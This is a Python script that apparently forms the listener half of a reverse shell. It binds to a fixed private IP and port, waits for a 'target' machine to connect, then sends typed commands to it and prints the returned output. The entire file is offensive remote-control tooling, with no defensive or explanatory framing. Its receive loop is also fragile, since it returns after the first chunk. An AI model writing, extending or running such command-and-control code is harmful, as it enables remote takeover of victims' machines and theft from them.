import socket
import json
import subprocess

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            received_data = target.recv(1024).decode().rstrip()
            if received_data:
                data += received_data
                return json.loads(data)
        except ValueError:
            continue

def target_communication():
    while True:
        command = input('*shell~%s: ' % str(ip))
        reliable_send(command)
        if command.lower() == 'quit':
            break
        else:
            result = reliable_recv()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.113.142', 5555))
print('[*] Listening for incoming connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target connected From: ' + str(ip))
target_communication()
